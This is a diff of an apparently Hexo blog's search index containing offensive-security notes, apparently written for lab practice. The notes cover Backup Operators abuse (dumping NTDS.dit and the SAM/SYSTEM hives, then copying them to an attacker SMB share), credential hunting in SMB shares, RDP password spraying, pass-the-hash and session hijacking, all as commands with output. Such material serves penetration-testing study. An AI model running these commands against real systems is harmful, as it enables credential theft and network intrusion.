@@ -283,43 +283,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Credential Hunting in Network Shares</title>
-    <url>/2025/11/27/Credential-Hunting-in-Network-Shares/</url>
-    <content><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="From-Domain-Joined-Machine"><a href="#From-Domain-Joined-Machine" class="headerlink" title="From Domain Joined Machine"></a>From Domain Joined Machine</h2><h3 id="Snaffler"><a href="#Snaffler" class="headerlink" title="Snaffler"></a>Snaffler</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\Users\Public&gt;Snaffler.exe <span class="literal">-s</span></span><br></pre></td></tr></table></figure>
-
-
-<ul>
-<li><code>-u : retrieves a list of users from Active Directory and searches for references to them in files</code></li>
-<li><code>-i and -n allow you to specify which shares should be included in the search.</code></li>
-</ul>
-<h2 id="Non-Domain-Joined-Machine"><a href="#Non-Domain-Joined-Machine" class="headerlink" title="Non Domain Joined Machine"></a>Non Domain Joined Machine</h2><h3 id="PowerHuntShares"><a href="#PowerHuntShares" class="headerlink" title="PowerHuntShares"></a>PowerHuntShares</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Unblock-File</span> <span class="literal">-Path</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Import-Module</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Invoke-HuntSMBShares</span> <span class="literal">-Threads</span> <span class="number">100</span> <span class="literal">-OutputDirectory</span> c:\Users\Public</span><br><span class="line"></span><br><span class="line">[*][<span class="number">05</span>/<span class="number">01</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">51</span>] Output Directory: c:\Users\Public\SmbShareHunt<span class="literal">-05012025125123</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="MANSPIDER"><a href="#MANSPIDER" class="headerlink" title="MANSPIDER"></a>MANSPIDER</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;passw&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\Company\Forms\HR_Form_14.pdf: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password: SecureDocs99</span><br><span class="line">[+] 10.129.182.89\Company\Forms\Incident_Report_57.xlsx: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password=Summer2023!</span><br><span class="line"></span><br><span class="line">&lt;snip&gt;</span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;INLANEFREIGHT&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;INLANEFREIGHT&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Netexec"><a href="#Netexec" class="headerlink" title="Netexec"></a>Netexec</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 10.129.234.121 -u mendres -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span> --spider IT --content --pattern <span class="string">&quot;passw&quot;</span></span><br><span class="line"></span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.129.234.121  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! </span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Started spidering</span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Spidering .</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
-
-<p>We can also download the files locally:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 104.152.52.235 -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True</span><br></pre></td></tr></table></figure>
-
-<p>Then search for the pattern we want:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br></pre></td></tr></table></figure>
-
-<p>Example result</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br><span class="line"></span><br><span class="line">Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Service-Enumeration</category>
-        <category>SMB</category>
-      </categories>
-      <tags>
-        <tag>SMB</tag>
-        <tag>Enumeration</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Attacking Child-Parent Trust From Windows</title>
     <url>/2025/12/03/Attacking-Child-Parent-Trust-From-Windows/</url>
     <content><![CDATA[<h1 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h1><blockquote>
@@ -381,6 +344,126 @@
         <tag>PowerView</tag>
         <tag>Mimikatz</tag>
         <tag>Rubeus</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Backup Operators</title>
+    <url>/2026/03/06/Backup-Operators/</url>
+    <content><![CDATA[<blockquote>
+<p>➜ Backup Operators is a privileged Windows group whose members can back up and restore files on a system, regardless of file permissions. This group grants powerful privileges such as <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>, which allow bypassing access controls. These privileges can be abused to <code>read sensitive files like the SAM, SYSTEM, or NTDS.dit</code></p>
+</blockquote>
+<h2 id="Enabling-SeBackupPrivilege"><a href="#Enabling-SeBackupPrivilege" class="headerlink" title="Enabling SeBackupPrivilege"></a>Enabling SeBackupPrivilege</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== ========</span><br><span class="line"></span><br><span class="line">SeBackupPrivilege             Back up files and directories  Disabled</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ In some cases, the privilege is present but disabled by default. So we can enable it using this <a href="https://github.com/giuliano108/SeBackupPrivilege">PoC</a>.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; <span class="built_in">Import-Module</span> .\SeBackupPrivilegeUtils.dll</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; <span class="built_in">Import-Module</span> .\SeBackupPrivilegeCmdLets.dll</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; <span class="built_in">Set-SeBackupPrivilege</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; <span class="built_in">Get-SeBackupPrivilege</span></span><br><span class="line">SeBackupPrivilege is enabled</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== ========</span><br><span class="line"></span><br><span class="line">SeBackupPrivilege             Back up files and directories  Enabled</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Exploiting-Privilege"><a href="#Exploiting-Privilege" class="headerlink" title="Exploiting Privilege"></a>Exploiting Privilege</h2><h4 id="Copying-a-Protected-File"><a href="#Copying-a-Protected-File" class="headerlink" title="Copying a Protected File"></a>Copying a Protected File</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Copy-FileSeBackupPrivilege</span> <span class="string">&#x27;C:\Confidential\2021 Contract.txt&#x27;</span> .\Contract.txt</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="NTDS-dit"><a href="#NTDS-dit" class="headerlink" title="NTDS.dit"></a>NTDS.dit</h4><blockquote>
+<p>Since the NTDS database is actively used by the system and therefore locked by default, we can use the Windows <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow">diskshadow</a>  built-in tool to create a Volume Shadow Copy of the <code>C:</code> drive and mount it as the <code>E:</code> drive for offline access.</p>
+</blockquote>
+<h6 id="Mount-the-C-Drive-as-a-Shadow-Copy"><a href="#Mount-the-C-Drive-as-a-Shadow-Copy" class="headerlink" title="Mount the C: Drive as a Shadow Copy"></a>Mount the <code>C:</code> Drive as a Shadow Copy</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\svc_backup&gt; diskshadow.exe</span><br><span class="line"></span><br><span class="line">set context persistent nowriters</span><br><span class="line">set metadata C:\Temp\test.cab</span><br><span class="line">add volume C: alias dfs</span><br><span class="line">create</span><br><span class="line">expose %dfs% K:</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ This creates a shadow copy of C: and mounts it as drive K:.</p>
+</blockquote>
+<h6 id="Copy-NTDS-dit-Locally"><a href="#Copy-NTDS-dit-Locally" class="headerlink" title="Copy NTDS.dit Locally"></a>Copy NTDS.dit Locally</h6><p>Using <code>Robocopy</code></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; robocopy /B K:\Windows\ntds . ntds.dit</span><br></pre></td></tr></table></figure>
+
+<p>Using <code>Copy-FileSeBackupPrivilege</code></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Copy-FileSeBackupPrivilege</span> K:\Windows\NTDS\ntds.dit .\ntds.dit</span><br><span class="line"></span><br><span class="line">Copied <span class="number">16777216</span> bytes</span><br></pre></td></tr></table></figure>
+
+
+<h6 id="Copy-the-SYSTEM-Registry-Hive"><a href="#Copy-the-SYSTEM-Registry-Hive" class="headerlink" title="Copy the SYSTEM Registry Hive"></a>Copy the SYSTEM Registry Hive</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt;  reg save HKLM\SYSTEM SYSTEM.SAV</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"></span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">3</span>/<span class="number">2026</span>  <span class="number">11</span>:<span class="number">34</span> AM       <span class="number">16777216</span> ntds.dit</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">3</span>/<span class="number">2026</span>  <span class="number">11</span>:<span class="number">29</span> AM          <span class="number">12288</span> SeBackupPrivilegeCmdLets.dll</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">3</span>/<span class="number">2026</span>  <span class="number">11</span>:<span class="number">29</span> AM          <span class="number">16384</span> SeBackupPrivilegeUtils.dll</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">3</span>/<span class="number">2026</span>  <span class="number">11</span>:<span class="number">34</span> AM       <span class="number">17645568</span> SYSTEM.SAV</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Now both files are available locally:<br>•	ntds.dit<br>•	SYSTEM.SAV</p>
+</blockquote>
+<h6 id="Transfer-Files-to-Our-Machine"><a href="#Transfer-Files-to-Our-Machine" class="headerlink" title="Transfer Files to Our Machine"></a>Transfer Files to Our Machine</h6><blockquote>
+<p>Create an SMB server </p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  SeBackupPrivilege <span class="built_in">sudo</span> impacket-smbserver -smb2support share . -user <span class="built_in">test</span> -password P@ssw0rd</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Mount the share on the target</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\svc_backup&gt; net use n: \\10.10.16.214\share /user:test P@ssw0rd</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Copy the files to the share</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; <span class="built_in">copy</span> .\ntds.dit n:\ntds.dit</span><br><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; <span class="built_in">copy</span> .\SYSTEM.SAV  n:\SYSTEM.SAV</span><br></pre></td></tr></table></figure>
+
+<h6 id="Dump-the-NTDS-Database"><a href="#Dump-the-NTDS-Database" class="headerlink" title="Dump the NTDS Database"></a>Dump the NTDS Database</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  SeBackupPrivilege impacket-secretsdump -ntds ntds.dit -system SYSTEM.SAV LOCAL</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Dump-SAM"><a href="#Dump-SAM" class="headerlink" title="Dump SAM"></a>Dump SAM</h2><h6 id="Backing-up-SAM-and-SYSTEM-Registry-Hives"><a href="#Backing-up-SAM-and-SYSTEM-Registry-Hives" class="headerlink" title="Backing up SAM and SYSTEM Registry Hives"></a>Backing up SAM and SYSTEM Registry Hives</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; reg save HKLM\SYSTEM SYSTEM.SAV</span><br><span class="line"></span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\&gt; reg save HKLM\SAM SAM.SAV</span><br><span class="line"></span><br><span class="line">The operation completed successfully.</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Then transfer the files to our machine</p>
+</blockquote>
+<h6 id="Dump-the-SAM-Database"><a href="#Dump-the-SAM-Database" class="headerlink" title="Dump the SAM Database"></a>Dump the SAM Database</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ SeBackupPrivilege impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Privesc</category>
+      </categories>
+      <tags>
+        <tag>backup-operators</tag>
+        <tag>sebackupprivilege</tag>
+        <tag>diskshadow</tag>
+        <tag>ntds</tag>
+        <tag>active-directory</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Credential Hunting in Network Shares</title>
+    <url>/2025/11/27/Credential-Hunting-in-Network-Shares/</url>
+    <content><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="From-Domain-Joined-Machine"><a href="#From-Domain-Joined-Machine" class="headerlink" title="From Domain Joined Machine"></a>From Domain Joined Machine</h2><h3 id="Snaffler"><a href="#Snaffler" class="headerlink" title="Snaffler"></a>Snaffler</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\Users\Public&gt;Snaffler.exe <span class="literal">-s</span></span><br></pre></td></tr></table></figure>
+
+
+<ul>
+<li><code>-u : retrieves a list of users from Active Directory and searches for references to them in files</code></li>
+<li><code>-i and -n allow you to specify which shares should be included in the search.</code></li>
+</ul>
+<h2 id="Non-Domain-Joined-Machine"><a href="#Non-Domain-Joined-Machine" class="headerlink" title="Non Domain Joined Machine"></a>Non Domain Joined Machine</h2><h3 id="PowerHuntShares"><a href="#PowerHuntShares" class="headerlink" title="PowerHuntShares"></a>PowerHuntShares</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Unblock-File</span> <span class="literal">-Path</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Import-Module</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Invoke-HuntSMBShares</span> <span class="literal">-Threads</span> <span class="number">100</span> <span class="literal">-OutputDirectory</span> c:\Users\Public</span><br><span class="line"></span><br><span class="line">[*][<span class="number">05</span>/<span class="number">01</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">51</span>] Output Directory: c:\Users\Public\SmbShareHunt<span class="literal">-05012025125123</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="MANSPIDER"><a href="#MANSPIDER" class="headerlink" title="MANSPIDER"></a>MANSPIDER</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;passw&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\Company\Forms\HR_Form_14.pdf: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password: SecureDocs99</span><br><span class="line">[+] 10.129.182.89\Company\Forms\Incident_Report_57.xlsx: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password=Summer2023!</span><br><span class="line"></span><br><span class="line">&lt;snip&gt;</span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;INLANEFREIGHT&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;INLANEFREIGHT&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Netexec"><a href="#Netexec" class="headerlink" title="Netexec"></a>Netexec</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 10.129.234.121 -u mendres -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span> --spider IT --content --pattern <span class="string">&quot;passw&quot;</span></span><br><span class="line"></span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.129.234.121  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! </span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Started spidering</span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Spidering .</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
+
+<p>We can also download the files locally:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 104.152.52.235 -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True</span><br></pre></td></tr></table></figure>
+
+<p>Then search for the pattern we want:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br></pre></td></tr></table></figure>
+
+<p>Example result</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br><span class="line"></span><br><span class="line">Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Service-Enumeration</category>
+        <category>SMB</category>
+      </categories>
+      <tags>
+        <tag>SMB</tag>
+        <tag>Enumeration</tag>
       </tags>
   </entry>
   <entry>
@@ -1230,51 +1313,46 @@
       </tags>
   </entry>
   <entry>
-    <title>Windows Credential Hunting</title>
-    <url>/2025/11/26/Windows-Credential-Hunting/</url>
-    <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
-<li><code>C:\Users\ALA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
-<li><code>Passwords in Group Policy in the SYSVOL share</code></li>
-<li><code>Passwords in scripts in the SYSVOL share</code></li>
-<li><code>Password in scripts on IT shares</code></li>
-<li><code>Passwords in web.config files on dev machines and IT shares</code></li>
-<li><code>Password in unattend.xml</code></li>
-<li><code>Passwords in the AD user or computer description fields</code></li>
-<li><code>KeePass databases (if we are able to guess or crack the master password)</code></li>
-<li><code>Found on user systems and shares</code></li>
-<li><code>Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint</code></li>
-</ul>
-<h2 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h2><p>Normal User Access : </p>
-<ul>
-<li><code>Browser passwords (Chrome / Edge / Firefox)</code></li>
-<li><code>Application credentials</code></li>
-<li><code>Wifi passwords</code></li>
-<li><code>Chat app passwords</code></li>
-<li><code>Mail client passwords</code></li>
-<li><code>Windows Credential Manager secrets (current user only)</code></li>
-</ul>
-<p>Administrator Access :</p>
-<ul>
-<li><code>LSASS</code></li>
-<li><code>LSA</code></li>
-<li><code>KeePass memory extraction</code></li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">bob</span>\<span class="title">Desktop</span>&gt; <span class="title">start</span> <span class="title">LaZagne.exe</span> <span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">Guest</span>:501:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">DefaultAccount</span>:503:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">WDAGUtilityAccount</span>:504:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:72639<span class="title">bbb94990305b5a015220f8de34e</span>:::</span></span><br><span class="line"><span class="function"><span class="title">bob</span>:1001:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="title">c0e5d303ec84884ad5c3b7876a06ea6</span>:::</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">########## <span class="title">User</span>: <span class="title">bob</span> ##########</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------- <span class="title">Winscp</span> <span class="title">passwords</span> -----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Password</span> <span class="title">found</span> !!!</span></span><br><span class="line"><span class="function"><span class="title">URL</span>: 10.129.202.64</span></span><br><span class="line"><span class="function"><span class="title">Login</span>: <span class="title">ubuntu</span></span></span><br><span class="line"><span class="function"><span class="title">Password</span>: <span class="title">FSadmin123</span></span></span><br><span class="line"><span class="function"><span class="title">Port</span>: 22</span></span><br></pre></td></tr></table></figure>
+    <title>RDP Exploitation</title>
+    <url>/2025/12/04/RDP-Exploitation/</url>
+    <content><![CDATA[<h1 id="Password-Spray"><a href="#Password-Spray" class="headerlink" title="Password Spray"></a>Password Spray</h1><h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L usernames.txt -p <span class="string">&#x27;Pwd&#x27;</span> ip rdp</span><br></pre></td></tr></table></figure>
+
+<h4 id="Crowbar"><a href="#Crowbar" class="headerlink" title="Crowbar"></a>Crowbar</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crowbar -b rdp -s ip/32 -U usernames.txt -c &#x27;Pwd&#x27;</span><br></pre></td></tr></table></figure>
 
 
-<h2 id="Search-for-File-Content-findstr"><a href="#Search-for-File-Content-findstr" class="headerlink" title="Search for File Content - findstr"></a>Search for File Content - findstr</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">findstr /SIM /C:<span class="string">&quot;password&quot;</span> /C:<span class="string">&quot;passphrase&quot;</span> /C:<span class="string">&quot;key&quot;</span> /C:<span class="string">&quot;username&quot;</span> /C:<span class="string">&quot;user account&quot;</span> /C:<span class="string">&quot;creds&quot;</span> /C:<span class="string">&quot;users&quot;</span> /C:<span class="string">&quot;passkeys&quot;</span> /C:<span class="string">&quot;configuration&quot;</span> /C:<span class="string">&quot;dbcredential&quot;</span> /C:<span class="string">&quot;dbpassword&quot;</span> /C:<span class="string">&quot;pwd&quot;</span> /C:<span class="string">&quot;login&quot;</span> /C:<span class="string">&quot;credentials&quot;</span> *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</span><br></pre></td></tr></table></figure>
+<h1 id="Pass-The-Hash-ptt"><a href="#Pass-The-Hash-ptt" class="headerlink" title="Pass The Hash ( ptt )"></a>Pass The Hash ( ptt )</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:ip /u:username /pth:<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>Sometimes we may be blocked because Restricted Admin Mode is disabled by default, so we can enable it using PowerShell and then try PtH again:</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d <span class="number">0</span>x0 /f</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="RDP-Session-Hijacking"><a href="#RDP-Session-Hijacking" class="headerlink" title="RDP Session Hijacking"></a>RDP Session Hijacking</h1><blockquote>
+<p>If we get <code>SYSTEM privileges</code> on the target machine, we can hijack an active RDP session, potentially taking over a Domain Admin account.</p>
+</blockquote>
+<p>List active RDP sessions</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; query user</span><br><span class="line"></span><br><span class="line"> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME</span><br><span class="line">&gt;twistzz               rdp<span class="literal">-tcp</span><span class="comment">#13          1  Active          7  8/25/2021 1:23 AM</span></span><br><span class="line"> test                  rdp<span class="literal">-tcp</span><span class="comment">#14          2  Active          *  8/25/2021 1:28 AM</span></span><br></pre></td></tr></table></figure>
+
+<p>Creating a new service with <code>sc.exe</code> and attaching ourselves to another user session using <code>tscon</code></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; sc.exe create service<span class="literal">-name</span> binpath= <span class="string">&quot;cmd.exe /k tscon TARGET_SESSION_ID /dest: OUR_SESSION_NAME &quot;</span></span><br><span class="line"></span><br><span class="line">[<span class="type">SC</span>] CreateService SUCCESS</span><br></pre></td></tr></table></figure>
+
+<p>Start the service to hijack the session</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; net <span class="built_in">start</span> service<span class="literal">-name</span></span><br></pre></td></tr></table></figure>
 
 
 ]]></content>
       <categories>
         <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Credential Hunting</category>
+        <category>Service-Exploitation</category>
+        <category>RDP</category>
       </categories>
       <tags>
-        <tag>Lazagne</tag>
-        <tag>Search-for-File-Content</tag>
+        <tag>RDP</tag>
+        <tag>RDP-Session-Hijacking</tag>
+        <tag>Crowbar</tag>
+        <tag>Hydra</tag>
       </tags>
   </entry>
   <entry>
@@ -1381,49 +1459,6 @@
       </tags>
   </entry>
   <entry>
-    <title>RDP Exploitation</title>
-    <url>/2025/12/04/RDP-Exploitation/</url>
